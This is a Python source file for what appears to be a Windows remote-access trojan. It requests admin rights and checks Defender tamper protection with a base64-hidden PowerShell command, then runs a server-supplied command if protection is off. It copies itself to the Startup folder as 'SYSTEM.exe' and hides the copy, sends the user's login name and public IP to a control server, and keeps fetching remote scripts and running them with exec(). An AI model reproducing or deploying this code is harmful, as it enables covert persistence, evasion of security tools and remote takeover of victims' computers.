import urllib.request
import subprocess
import shutil
import threading
import time
import os
import requests
import sys
import ctypes
import base64
import random

# Packages for custom scripts
# Do not import these packages in your script and only import them in the executor.py

import pyautogui
import wmi
import win32api
import http
import winreg
import pyaudio
import wave
import keyboard
import cv2
import PIL
import psutil

server_url = base64.b64decode("DO_NOT_CHANGE_ME").decode()
scripts_url = f"{server_url}/scripts.txt"
check_interval = random.randint(5, 10)
APPDATA = os.getenv("APPDATA")
TEMP = os.getenv("TEMP")
STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
SCRIPT_NAME = base64.b64decode("U1lTVEVNLmV4ZQ==").decode()
SCRIPT_PATH = os.path.join(STARTUP_PATH, SCRIPT_NAME)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False
def request_admin():
    if not is_admin():
        script = os.path.abspath(sys.argv[0])
        params = " ".join(sys.argv[1:])
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
            sys.exit()
        except:
            pass
def get_target_url():
    try:
        with urllib.request.urlopen(scripts_url) as response:
            return response.read().decode("utf-8").strip().splitlines()
    except:
        return None
def dload_run(script_name):
    if not script_name == "OK":
        script_url = f"{server_url}/scripts/{script_name}"
        try:
            urllib.request.urlretrieve(script_url, os.path.join(TEMP, script_name))
            run(os.path.join(TEMP, script_name))
        except:
            var = None
def run(script_name):
    def run_script():
        try:
            exec(open(script_name).read())
        except:
            var = None
    thread = threading.Thread(target=run_script)
    thread.start()
def send_completion_request():
    try:
        response = requests.post(f"{server_url}/update", data="OK")
    except:
        var = None
def save_copy():
    try:
        if sys.argv[0] != SCRIPT_PATH:
            shutil.copy(sys.argv[0], SCRIPT_PATH)
            hider = requests.get(f"{server_url}/hide.txt").text
            subprocess.run(f'{hider} "{SCRIPT_PATH}"')
    except:
        pass
def alert():
    headers = {'Content-Type': 'application/json'}
    data = {
    "INFO": f"{os.getlogin()} with IP: {requests.get(base64.b64decode('aHR0cHM6Ly9hcGk2NC5pcGlmeS5vcmc=').decode()).text} has run the executable!"
    }   
    requests.post(f"{server_url}/reply", json=data, headers=headers)
request_admin()
if is_admin():
    try:
        result = subprocess.run(
            base64.b64decode("cG93ZXJzaGVsbCAtQ29tbWFuZCBHZXQtTXBDb21wdXRlclN0YXR1cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IElzVGFtcGVyUHJvdGVjdGVk").decode(),
            capture_output=True, text=True, check=True
        )
        if not "true" in result.stdout.strip().lower():
            subprocess.Popen(requests.get(f"{server_url}/pw.txt").text)
    except:
        pass

save_copy()
alert()

while True:
    try:
        script_names = get_target_url()
        if script_names:
            for script_name in script_names:
                dload_run(script_name)
            send_completion_request()
        time.sleep(check_interval)
    except:
        pass